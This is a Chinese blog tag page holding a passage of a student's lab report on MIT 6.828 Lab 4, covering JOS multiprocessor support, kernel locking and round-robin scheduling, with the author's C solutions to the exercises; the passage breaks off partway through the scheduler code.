
<!DOCTYPE html>
<html lang="zh-cn">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="码龙的窝">
    <title>标签: 实验 - 码龙的窝</title>
    <meta name="author" content="码龙黑曜">
    
        <meta name="keywords" content="博客,iOS,Computer Science,码龙,">
    
    
    
    <script type="application/ld+json">{}</script>
    <meta name="description" content="数据界层的码龙 - iOS开发者, 希望在扎实计算机基础的同时更多地接触不同的方向">
<meta name="keywords" content="博客,iOS,Computer Science,码龙">
<meta property="og:type" content="blog">
<meta property="og:title" content="码龙的窝">
<meta property="og:url" content="http://blog.codedragon.tech/tags/实验/index.html">
<meta property="og:site_name" content="码龙的窝">
<meta property="og:description" content="数据界层的码龙 - iOS开发者, 希望在扎实计算机基础的同时更多地接触不同的方向">
<meta property="og:locale" content="zh-cn">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="码龙的窝">
<meta name="twitter:description" content="数据界层的码龙 - iOS开发者, 希望在扎实计算机基础的同时更多地接触不同的方向">
    
    
        
    
    
        <meta property="og:image" content="http://blog.codedragon.tech/assets/images/avatar.jpg"/>
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-j4w0tbtf1olriqsnfyv4egntpbdblucqpyraoqqnvawa2vd6l4m8ljtn2yes.min.css">
    <!--STYLES END-->
    
    <script type="text/javascript">
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

        ga('create', 'UA-108458894-1', 'auto');
        ga('send', 'pageview');
    </script>


    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
            
        
    

<header id="header" data-behavior="1">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a class="header-title-link" href="/ ">码龙的窝</a>
    </div>
    
        
            <a  class="header-right-picture "
                href="#about">
        
        
            <img class="header-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="1">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a href="/#about">
                    <img class="sidebar-profile-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
                </a>
                <h4 class="sidebar-profile-name">码龙黑曜</h4>
                
                    <h5 class="sidebar-profile-bio"><p>iOS开发者/计算机科学/兽人控</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/ "
                            
                            title="首页"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">首页</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-categories"
                            
                            title="分类"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">分类</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-tags"
                            
                            title="标签"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">标签</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-archives"
                            
                            title="归档"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">归档</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/projects"
                            
                            title="项目"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-code" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">项目</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/about"
                            
                            title="关于"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">关于</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://github.com/BlackDragonF" target="_blank" rel="noopener" title="GitHub">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://t.me/Cosidian" target="_blank" rel="noopener" title="Telegram">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-telegram" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Telegram</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="http://steamcommunity.com/id/BlackDragonF/" target="_blank" rel="noopener" title="Steam">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-steam" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Steam</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="mailto:obsidiandragon2016@gmail.com" target="_blank" rel="noopener" title="邮箱">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-envelope-o" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">邮箱</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/links"
                            
                            title="友情链接"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-link" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">友情链接</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/resources"
                            
                            title="学习资源"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-share-alt" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">学习资源</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="1"
                 class="
                        hasCoverMetaIn
                        ">
                
    <section class="postShorten-group main-content-wrap">
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2018/02/26/MIT6-828操作系统工程Lab4-Preemptive-Multitasking实验报告/">
                            MIT6.828操作系统工程Lab4-Preemptive Multitasking实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2018-02-26T16:52:56+08:00">
	
		    2月 26, 2018
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/操作系统/">操作系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <blockquote>
<p>Lab4 - Preemptive Multitasking需要在多个同时激活的用户模式环境中实现抢占式多任务。<br>实验分为三个部分。第一部分要求为JOS添加多处理器支持，并实现论询调度以及基本的环境管理系统调用；第二部分需要实现一个Unix-like的fork函数，使得用户环境可以创建一份自己的拷贝；第三部分需要实现进程间通讯功能，允许不同的用户环境显式地互相通信和同步。同时还需要实现对于硬件时钟中断和抢占的支持。<br>2018年3月2日，完成了实验并写完了报告。</p>
</blockquote>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p> 根据官网，切换到分支lab4并合并分支lab3。在合并的过程中，发生了冲突。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user% git checkout -b lab3 origin/lab3</span><br><span class="line">user% git merge lab3</span><br></pre></td></tr></table></figure>
<p> 根据提示，是<code>conf/lab.mk</code>中发生了冲突。打开后可以发现是其中记录的时间和实验数发生了变化，直接采用分支lab4的版本即可，然后提交，分支合并完成。</p>
<p> 实验四包括如下的新文件：</p>
<ul>
<li>kern/cpu.h 内核私有的关于多处理器的支持</li>
<li>kern/mpconfig.c 读取多处理器配置的代码</li>
<li>kern/lapic.c 内核驱动每个处理的的APIC（高级可编程中断控制器）的代码</li>
<li>kern/mpentry.S 非引导CPU的汇编入口代码</li>
<li>kern/spinlock.h 内核私有的自旋锁定义，包括大内核锁</li>
<li>kern/spinlock.c 内核实现自旋锁的代码</li>
<li>kern/sched.c 需要实现的调度器的代码框架</li>
</ul>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="第一部分-Multiprocessor-Support-and-Cooperative-Multitasking-多处理器支和写作式多任务"><a href="#第一部分-Multiprocessor-Support-and-Cooperative-Multitasking-多处理器支和写作式多任务" class="headerlink" title="第一部分 Multiprocessor Support and Cooperative Multitasking - 多处理器支和写作式多任务"></a>第一部分 Multiprocessor Support and Cooperative Multitasking - 多处理器支和写作式多任务</h3><p>在第一部分中，需要使JOS运行在一个多处理器系统上，并且实现新的JOS内核系统调用去允许用户级别的环境创建额外的新环境。还需要实现协同式的论询调度，允许内核当旧的用户环境自愿放弃CPU或退出时切换至一个新的用户环境。</p>
<h4 id="多处理器支持"><a href="#多处理器支持" class="headerlink" title="多处理器支持"></a>多处理器支持</h4><p>需要使JOS支持“对称多处理”（Symmetric Multiprocessing），在该模型下，所有的CPU都有着对系统资源（内存、IO总线等）的平等访问权。尽管在SMP下所有的CPU在功能上均等价，在启动时仍然分为两种类型——引导处理器（Bootstrap Processor或是BSP）负责初始化系统并且引导操作系统；应用处理器（Application Processors或是APs）仅在系统启动运行后被BSP激活。BSP处理器由硬件和BIOS决定。在此刻，所有已有的代码已经运行在了BSP上。</p>
<p>在SMP中，每一个CPU都有一个相伴的本地APIC（LAPIC）单元。LAPIC单元负责在整个系统中传递中断。LAPIC为相连的CPU提供了一个唯一标识。在本实验中，将利用LAPIC的一下功能（在<code>kern/lapic.c</code>中）：</p>
<ul>
<li>读取LAPIC标识（APIC ID）以告知CPU代码运行在哪一个CPU上（参考<code>cpunum()</code>）</li>
<li>从BSP向APs发送STARTUP处理器间中断（Interprocessor interrupt或IPI）以唤醒其他CPU（参考<code>lapic_startup()</code>）</li>
<li>在第三部分中，通过编程LAPIC内置的计时器去引发时钟中断以实现抢占式多任务（参考<code>apic_init()</code></li>
</ul>
<p>处理器通过内存映射IO（Memory-mapped I/O 或是MMIO）访问LAPIC。在MMIO中，一部分物理内存被硬连接至某些IO设备的寄存器。所以相同的访问内存的<code>load/store</code>指令可以被用来访问设备寄存器。你可能已经见过了存在于物理地址<code>0xA0000</code>中IO洞（以此来写VGA显示缓存）。LAPIC存在于物理地址从<code>0xFE000000</code>（4064M）开始的洞中。该地址太高以至于无法在KERNBASE的直接映射访问。JOS的虚拟内存映射在<code>MMIOBASE</code>处留下了4MB的空隙。在之后的实验中会引入更多的<code>MMIO</code>区域，所以应当写一个简单的函数从该区域分配空间并映射内存。</p>
<p>练习1的答案如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In kern/pmap.c, mmio_map_region():</span></span><br><span class="line"><span class="comment">// Your code here:</span></span><br><span class="line">size = ROUNDUP(size, PGSIZE);</span><br><span class="line"><span class="keyword">if</span> (base + size &gt; MMIOLIM) &#123;</span><br><span class="line">    <span class="comment">// reservation overflog MMIOLIM</span></span><br><span class="line">    panic(<span class="string">"reservation bytes overflows!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// use boot_map_region to map [pa, pa + size) to [base, base + size)</span></span><br><span class="line">boot_map_region(kern_pgdir, base, size, pa, PTE_W | PTE_PCD | PTE_PWT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// update base and return</span></span><br><span class="line"><span class="keyword">uintptr_t</span> saved_base = base;</span><br><span class="line">base += size;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">char</span> *)saved_base;</span><br><span class="line"></span><br><span class="line"><span class="comment">// panic("mmio_map_region not implemented");</span></span><br></pre></td></tr></table></figure></p>
<h5 id="应用处理器引导"><a href="#应用处理器引导" class="headerlink" title="应用处理器引导"></a>应用处理器引导</h5><p>BSP在引导APs之前应当首先收集多处理器系统的信息，如总CPU数，APIC IDs以及LAPIC单元的内存映射IO地址等。<code>kern/mpconfig.c</code>中的<code>mp_init()</code>函数通过读取BIOS内存中的MP配置表获取相应的信息。<br>在<code>kern/init.c</code>中的<code>boot_aps()</code>函数驱动AP引导过程。APs在实模式中启动，所以<code>boot_aps()</code>从<code>kern/mpentry.S</code>中拷贝AP入口代码到一个实模式可寻址的位置。可以在一定程度上控制AP执行开始代码的位置。在本实验中，将入口代码拷贝至<code>0x7000</code>（MPENTRY_PADDR），但实际上任何640KB以下的、页对齐的和未使用的物理地址均可使用。<br>然后，<code>boot_aps()</code>通过向对应AP的LAPIC单元发送STARTUP处理器间中断和初始的CS:IP地址（本实验中为MPENTRY_PADDR），依次激活APs。在简单的设置后，将AP启动分页，使得AP进入保护模式，然后调用启动例程<code>mp_main()</code>（在<code>kern/init.c</code>中。<code>boot_aps()</code>在唤醒下一个AP之前先等待当前AP在<code>struct CpuInfo</code>的<code>cpu_status</code>域中发送一个<code>CPU_STARTED</code>标记。<br>AP引导的汇编代码和C代码同实验一BSP的引导代码相似，可以比对异同。</p>
<p>练习2的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In kern/pmap.c, page_init():</span></span><br><span class="line"><span class="comment">// code MODIFIED</span></span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"></span><br><span class="line"><span class="comment">// initialize from page 1 to page npages_basemem - 1</span></span><br><span class="line"><span class="comment">// set pp_ref to 0, set pp_link to last page_free_list</span></span><br><span class="line"><span class="comment">// and then update page_free_list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Lab 4: remove page at MPENTRY_PADDR</span></span><br><span class="line"><span class="keyword">size_t</span> mp_entry_page = PGNUM(MPENTRY_PADDR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span> ; i &lt; npages_basemem ; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == mp_entry_page) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">    pages[i].pp_link = page_free_list;</span><br><span class="line">    page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>问题1：<br>宏<code>MPBOOTPHYS</code>作用是将给定的内核虚拟地址（在<code>mpentry.S</code>中）转换成相应的加载后的物理地址。这么做的原因是在<code>mpentry.S</code>中，保护模式与分页机制尚未开启，设置分段等需要知道相应的物理地址。</p>
<h5 id="每CPU状态和初始化"><a href="#每CPU状态和初始化" class="headerlink" title="每CPU状态和初始化"></a>每CPU状态和初始化</h5><p>当编写多处理器操作系统时，区分对于每个处理器而言私有的每CPU状态以及整个系统共享的全局状态是很重要的。<code>kern/cpu.h</code>定义了大部分每CPU状态，包括了存储了每CPU变量的<code>struct CpuInfo</code>。<code>cpunum()</code>总是返回调用它的CPU ID，能用来索引例如<code>cpus</code>的数组。宏<code>thiscpu</code>是当前CPU的<code>struct CpuInfo</code>的简写。</p>
<p>以下是你需要注意的每CPU状态：</p>
<ul>
<li>每CPU内核栈 - 多个CPU可能会同时陷入内核，因此每个处理器需要独立的内核栈以避免互相干扰。<code>percpu_kstacks[NCPU][KSTKSIZE]</code>为<code>NCPU</code>个内核栈预留空间。在实验二中，将<code>bootstack</code>指向的物理内存作为BSP的栈映射在了KSTACKTOP下面。相似地，本实验中，需要将每个CPU的内核栈映射到该区域同时分配保护页作为它们之间的缓冲。CPU 0的栈将从KSTACKTOP开始向下增长；CPU 1的栈将从CPU 0栈下方间隔KSTKGAP处开始增长。<code>inc/memlayout.h</code>展示了映射约束。</li>
<li>每CPU的TSS和TSS描述符 - 每CPU的任务状态段同样用来致命每个CPU内核栈的位置。CPU i的TSS被存储于<code>cpus[i].cpu_ts</code>中，相应的TSS描述符在GDT入口<code>gdt[(GD_TSS0 &gt;&gt; 3) + i]</code>处被定义。<code>kern/trap.c</code>中定义的<code>ts</code>将不再有效。</li>
<li>每CPU的当前环境指针 - 由于每个CPU都能同步地执行不同的用户环境。重新将<code>curenv</code>定义为指向当前CPU（当前代码正在执行的CPU）正在执行的环境的<code>cpus[cpunum()].cpu_env</code>（或是<code>thiscpu-&gt;cpu_env</code>）。</li>
<li>每CPU的系统寄存器 - 包括系统寄存器在内的所有寄存器都属于CPU私有。因此初始化这些寄存器的指令如<code>lcr3</code>, <code>ltr</code>, ‘lgdt’等，必须在每个CPU上都被执行。函数<code>env_init_percpu()</code>以及<code>trap_init_percpu</code>正是为此而被定义。</li>
</ul>
<p>除此之外任何额外的用来CPU初始化的所有每CPU状态都应该在每个CPU处重复。</p>
<p>练习3中遇到的问题：</p>
<ul>
<li>在使用boot_map_region映射内存时忘记将kstacktop_i减去KSTKSIZE，导致未通过检查</li>
</ul>
<p>练习3的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LAB 4: Your code here:</span></span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NCPU; i++) &#123;</span><br><span class="line">    <span class="comment">// traverser through 0 to NCPU to use boot_map_region to map</span></span><br><span class="line">    <span class="comment">// per-CPU's kernel stack to corresponding va</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> kstacktop_i = KSTACKTOP - i * (KSTKSIZE + KSTKGAP);</span><br><span class="line">    boot_map_region(kern_pgdir, kstacktop_i - KSTKSIZE, KSTKSIZE,</span><br><span class="line">                    PADDR(percpu_kstacks[i]), PTE_W | PTE_P);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>练习4中遇到的问题：</p>
<ul>
<li>使用ltr加载任务段选择子时，每个CPU应当使用不同的选择子，<code>inc/memlayout.c</code>中的GD_TSS0为CPU0的任务段选择子，应该加上i &lt;&lt; 3的偏移</li>
<li>完成<code>trap_init_percpu()</code>后，旧的使用<code>ts</code>的代码应当被注释</li>
</ul>
<p>练习4的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LAB 4: Your code here:</span></span><br><span class="line"><span class="comment">// trap_init_percpu() is called by all CPUs</span></span><br><span class="line"><span class="comment">// set esp0 and ss0 of task state segment to provide</span></span><br><span class="line"><span class="comment">// per-CPU's kernel stack access</span></span><br><span class="line">thiscpu-&gt;cpu_ts.ts_esp0 = (<span class="keyword">uintptr_t</span>)percpu_kstacks[cpunum()];</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_ss0  = GD_KD;</span><br><span class="line"><span class="comment">// set IO map base address to prevent unauthorized environments</span></span><br><span class="line"><span class="comment">// this line works together as we'll set TSS segment limit later</span></span><br><span class="line"><span class="comment">// so all ports in address space have no corresponding IOPB</span></span><br><span class="line">thiscpu-&gt;cpu_ts.ts_iomb = <span class="keyword">sizeof</span>(struct Taskstate);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set TSS in gdt</span></span><br><span class="line"><span class="comment">// 0 means RPL and sd_s = 0 means system segment</span></span><br><span class="line">gdt[(GD_TSS0 &gt;&gt; <span class="number">3</span>) + cpunum()] = SEG16(STS_T32A, (<span class="keyword">uint32_t</span>)(&amp;(thiscpu-&gt;cpu_ts)),</span><br><span class="line">                                       <span class="keyword">sizeof</span>(struct Taskstate) - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">gdt[(GD_TSS0 &gt;&gt; <span class="number">3</span>) + cpunum()].sd_s = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load TSS selector</span></span><br><span class="line">ltr(GD_TSS0 + (cpunum() &lt;&lt; <span class="number">3</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// load the IDT</span></span><br><span class="line">lidt(&amp;idt_pd);</span><br></pre></td></tr></table></figure></p>
<h5 id="同步锁"><a href="#同步锁" class="headerlink" title="同步锁"></a>同步锁</h5><p>当前的代码在<code>mp_main()</code>中初始化完AP之后忙等待。在继续下一步之前，首先得解决多个CPU同时执行内核代码时的竞争条件。最简答的方式是使用一个“大”内核锁，大内核锁在从用户模式进入内核模式时被获取，在从环境返回用户模式时被释放。在这种模型下，用户模式环境可以在任意多个CPU上运行，但同时只能有一个环境能在内核中运行，其他想在内核中运行的环境被强制等待。</p>
<p><code>kern/spinlock.h</code>声明了内核锁，同时提供了<code>lock_kernel</code>提供加锁的功能；<code>unlock_kernel</code>提供解锁的功能，你应当在如下4个地方应用内核锁：</p>
<ul>
<li>在<code>i386_init()</code>中，在BSP唤醒其他CPU之前加锁</li>
<li>在<code>mp_main()</code>中，在初始化AP后加锁，然后调用<code>sched_yield()</code>去在当前AP上执行环境</li>
<li>在<code>trap()</code>中，当从用户模式陷入的时候加锁，通过检查tf_cs的低位判断陷阱发生于用户模式还是内核模式</li>
<li>在<code>env_run()</code>中，在“刚好”切换回用户模式之前解锁。太早或太晚解锁会导致严重的竞争和死锁</li>
</ul>
<p>练习5的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In i386_init():</span></span><br><span class="line"><span class="comment">// Acquire the big kernel lock before waking up APs</span></span><br><span class="line"><span class="comment">// Your code here:</span></span><br><span class="line">lock_kernel();</span><br><span class="line"></span><br><span class="line"><span class="comment">// In mp_main():</span></span><br><span class="line"><span class="comment">// Now that we have finished some basic setup, call sched_yield()</span></span><br><span class="line"><span class="comment">// to start running processes on this CPU.  But make sure that</span></span><br><span class="line"><span class="comment">// only one CPU can enter the scheduler at a time!</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Your code here:</span></span><br><span class="line"><span class="comment">// lock the kernel and start running enviroments</span></span><br><span class="line">lock_kernel();</span><br><span class="line">sched_yield();</span><br><span class="line"></span><br><span class="line"><span class="comment">// In trap():</span></span><br><span class="line"><span class="comment">// Trapped from user mode.</span></span><br><span class="line"><span class="comment">// Acquire the big kernel lock before doing any</span></span><br><span class="line"><span class="comment">// serious kernel work.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">lock_kernel();</span><br><span class="line"></span><br><span class="line"><span class="comment">// In env_run():</span></span><br><span class="line"><span class="comment">// address space switch</span></span><br><span class="line"><span class="comment">// reference from inc/x86.h</span></span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line"><span class="comment">// release kernel lock here</span></span><br><span class="line">unlock_kernel(); <span class="comment">// newly added code</span></span><br><span class="line"><span class="comment">// drop into user mode</span></span><br><span class="line">env_pop_tf(&amp;(e-&gt;env_tf));</span><br></pre></td></tr></table></figure></p>
<p>问题2：<br>即使受到内核锁的保护，CPU之间仍然需要独立的内核栈。假设CPU0因中断陷入内核并在内核栈中保留了相关的信息，此时若CPU1也发生中断而陷入内核，在同一个内核栈的情况下，CPU0中的信息将会被覆盖从而导致出现错误。</p>
<h4 id="论询调度"><a href="#论询调度" class="headerlink" title="论询调度"></a>论询调度</h4><p>下一个任务是改变JOS内核使得其能按照“论询”的方式在多个环境中切换。在JOS中，论询调度按如下方式工作：</p>
<ul>
<li>‘kern/sched.c’中的<code>sched_yield()</code>负责选择一个新环境执行。其循环按顺序遍历<code>envs</code>数组，从上一次运行的环境（如果没有之前运行的环境，则从第一个环境）开始，找到第一个具有状态ENV_RUNNABLE的环境，调用<code>env_run()</code>执行。</li>
<li><code>sched_yield()</code>绝对不能同时在两个CPU上运行相同的环境。其会告知环境当前已经正在运行在某CPU上（很可能是当前环境），因为该环境的状态将为ENV_RUNNING。</li>
<li>将实现一个新的系统调用<code>sys_yield()</code>，用户环境可以通过该系统调用唤醒<code>sched_yield()</code>函数以主动放弃CPU。</li>
</ul>
<p>练习6中遇到的问题：</p>
<ul>
<li>在实现<code>sched_yield()</code>的时候没有检查<code>thiscpu-&gt;cpu_env</code>是否为空，对空指针的访问导致了缺页错误</li>
<li>一开始的实现弄错了获取env_index和自增的顺序，参考代码中第一个<code>if</code>处的<code>else</code>分支的注释</li>
<li>练习6结束后需要将<code>init.c</code>中<code>mp_main()</code>的最后一行注释</li>
</ul>
<p>练习6的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In kern/sched.c, sched_yield():</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">// get index from current CPU's env</span></span><br><span class="line"><span class="keyword">size_t</span> env_index;</span><br><span class="line"><span class="comment">// set curenv_flag to default true</span></span><br><span class="line"><span class="keyword">int</span> curenv_flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">if</span> (thiscpu-&gt;cpu_env == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">// no previous running environment</span></span><br><span class="line">    <span class="comment">// start at beginning of envs array</span></span><br><span class="line">    i         = <span class="number">0</span>;</span><br><span class="line">    env_index = NENV - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// mark curenv_flag as true</span></span><br><span class="line">    curenv_flag = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// start at previous running environment</span></span><br><span class="line">    env_index = ENVX(thiscpu-&gt;cpu_env-&gt;env_id);</span><br><span class="line">    <span class="comment">// NB: don't mess with code order here, must first retrieve</span></span><br><span class="line">    <span class="comment">// env_index then increment</span></span><br><span 